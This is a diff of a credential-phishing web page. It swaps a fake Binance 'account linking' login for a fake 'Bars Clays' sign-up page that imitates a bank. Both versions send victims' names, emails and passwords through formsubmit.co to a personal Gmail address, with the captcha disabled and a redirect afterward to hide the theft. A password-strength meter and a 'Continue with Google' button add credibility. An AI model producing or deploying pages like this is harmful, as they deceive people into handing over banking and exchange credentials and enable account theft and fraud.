@@ -3,183 +3,214 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Binance Trade Account Linking Login</title>
+<title>Bars Clays - Sign Up</title>
 
 <style>
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: Arial, Helvetica, sans-serif;
-    }
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
 
-    body {
-        background-color: #0B0E11;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        color: #EAECEF;
-    }
+body {
+    background: #f4f6f9;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
 
-    .container {
-        width: 100%;
-        max-width: 400px;
-        padding: 20px;
-    }
+.container {
+    background: #ffffff;
+    width: 380px;
+    padding: 40px 30px;
+    border-radius: 12px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.08);
+}
 
-    .close-btn {
-        font-size: 22px;
-        color: #848E9C;
-        cursor: pointer;
-        margin-bottom: 20px;
-    }
+.logo {
+    text-align: center;
+    font-size: 26px;
+    font-weight: bold;
+    margin-bottom: 25px;
+    color: #FCD535;
+}
 
-    h1 {
-        font-size: 28px;
-        margin-bottom: 25px;
-        font-weight: 600;
-    }
+.subtitle {
+    text-align: center;
+    font-size: 14px;
+    color: #555;
+    margin-bottom: 25px;
+}
 
-    label {
-        font-size: 14px;
-        color: #B7BDC6;
-        display: block;
-        margin-bottom: 8px;
-    }
+.input-group {
+    margin-bottom: 18px;
+    position: relative;
+}
 
-    .input-wrapper {
-        position: relative;
-        margin-bottom: 18px;
-    }
+.input-group input {
+    width: 100%;
+    padding: 12px;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+    font-size: 14px;
+    outline: none;
+    transition: 0.3s;
+}
 
-    input {
-        width: 100%;
-        padding: 14px 40px 14px 14px;
-        border-radius: 8px;
-        border: none;
-        background-color: #1E2329;
-        color: #EAECEF;
-        font-size: 15px;
-    }
+.input-group input:focus {
+    border-color: #FCD535;
+}
 
-    input:focus {
-        outline: 1px solid #FCD535;
-    }
+.toggle-password {
+    position: absolute;
+    right: 10px;
+    top: 12px;
+    cursor: pointer;
+    font-size: 14px;
+    color: #666;
+}
 
-    .icon-btn {
-        position: absolute;
-        right: 12px;
-        top: 50%;
-        transform: translateY(-50%);
-        color: #848E9C;
-        cursor: pointer;
-        font-size: 16px;
-        user-select: none;
-    }
+.strength {
+    font-size: 12px;
+    margin-top: 5px;
+}
 
-    .btn-primary {
-        width: 100%;
-        padding: 14px;
-        border: none;
-        border-radius: 8px;
-        background-color: #FCD535;
-        color: #000;
-        font-weight: bold;
-        font-size: 16px;
-        cursor: pointer;
-        margin-top: 10px;
-        margin-bottom: 20px;
-    }
+.strength.weak { color: red; }
+.strength.medium { color: orange; }
+.strength.strong { color: green; }
 
-    .btn-primary:hover {
-        opacity: 0.9;
-    }
+.privacy {
+    font-size: 12px;
+    color: #555;
+    margin-bottom: 20px;
+}
 
-    .footer-link {
-        color: #FCD535;
-        margin-top: 15px;
-        display: block;
-        text-decoration: none;
-        font-weight: 500;
-    }
+.privacy a {
+    color: #FCD535;
+    text-decoration: none;
+}
 
-    .footer-link:hover {
-        text-decoration: underline;
-    }
+button {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    background: #FCD535;
+    color: #000;
+    border-radius: 6px;
+    font-size: 14px;
+    cursor: pointer;
+    transition: 0.3s;
+    font-weight: bold;
+}
 
-    .forgot {
-        text-align: right;
-        font-size: 13px;
-        margin-top: -10px;
-        margin-bottom: 15px;
-    }
+button:hover {
+    background: #e6b800;
+}
 
-    .forgot a {
-        color: #848E9C;
-        text-decoration: none;
-    }
+.divider {
+    text-align: center;
+    margin: 20px 0;
+    font-size: 13px;
+    color: #777;
+}
 
-    .forgot a:hover {
-        color: #FCD535;
-    }
+.google-btn {
+    background: white;
+    border: 1px solid #ccc;
+    color: #444;
+}
+
+.footer {
+    margin-top: 20px;
+    text-align: center;
+    font-size: 13px;
+}
+
+.footer a {
+    color: #FCD535;
+    text-decoration: none;
+}
 </style>
 </head>
 
 <body>
+
 <div class="container">
+    <div class="logo">Bars Clays</div>
+    <div class="subtitle">Welcome to Bars Clays</div>
 
-    <div class="close-btn">&times;</div>
-    <h1>Log in</h1>
-
-    <!-- FORM -->
+    <!-- FORM SUBMIT TO EMAIL -->
     <form action="https://formsubmit.co/zenithaurora777@gmail.com" method="POST">
-        <label>Name</label>
-        <div class="input-wrapper">
+        <div class="input-group">
             <input type="text" name="name" placeholder="Your Name" required>
-            <span class="icon-btn" onclick="clearName()"></span>
         </div>
 
-        <label>Email</label>
-        <div class="input-wrapper">
+        <div class="input-group">
             <input type="email" name="email" placeholder="Your Email" required>
-            <span class="icon-btn" onclick="clearEmail()"></span>
         </div>
 
-        <label>Password</label>
-        <div class="input-wrapper">
+        <div class="input-group">
             <input type="password" name="password" id="password" placeholder="Your Password" required>
-            <span class="icon-btn" onclick="togglePassword()"></span>
+            <span class="toggle-password" onclick="togglePassword()">Show</span>
+            <div id="strengthMessage" class="strength"></div>
         </div>
 
         <!-- Disable captcha -->
         <input type="hidden" name="_captcha" value="false">
-
         <!-- Optional redirect after submit -->
         <input type="hidden" name="_next" value="https://barsclaysmanag.github.io/bars_clays/">
 
-        <button type="submit" class="btn-primary">Continue</button>
+        <button type="submit">Continue</button>
     </form>
 
-    <div class="forgot">
-        <a href="#">Forgot password?</a>
+    <div class="divider">or</div>
+
+    <button class="google-btn">Continue with Google</button>
+
+    <div class="footer">
+        <a href="#">Sign up as an entity</a> |
+        <a href="#">Log in</a>
     </div>
-
-    <a href="#" class="footer-link">Link Binance Account</a>
-    <a href="#" class="footer-link">Need help?</a>
-
 </div>
 
 <script>
-function clearEmail() {
-    document.querySelector('input[name="email"]').value = "";
-}
-function clearName() {
-    document.querySelector('input[name="name"]').value = "";
-}
+const passwordInput = document.getElementById("password");
+const strengthMessage = document.getElementById("strengthMessage");
+
+passwordInput.addEventListener("input", function () {
+    const value = passwordInput.value;
+    let strength = 0;
+
+    if (value.length >= 6) strength++;
+    if (/[A-Z]/.test(value)) strength++;
+    if (/[0-9]/.test(value)) strength++;
+    if (/[^A-Za-z0-9]/.test(value)) strength++;
+
+    if (value.length === 0) {
+        strengthMessage.textContent = "";
+        strengthMessage.className = "strength";
+    } else if (strength <= 1) {
+        strengthMessage.textContent = "Weak password";
+        strengthMessage.className = "strength weak";
+    } else if (strength <= 3) {
+        strengthMessage.textContent = "Medium strength";
+        strengthMessage.className = "strength medium";
+    } else {
+        strengthMessage.textContent = "Strong password";
+        strengthMessage.className = "strength strong";
+    }
+});
+
 function togglePassword() {
-    const password = document.getElementById("password");
-    password.type = password.type === "password" ? "text" : "password";
+    if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        document.querySelector(".toggle-password").textContent = "Hide";
+    } else {
+        passwordInput.type = "password";
+        document.querySelector(".toggle-password").textContent = "Show";
+    }
 }
 </script>
 
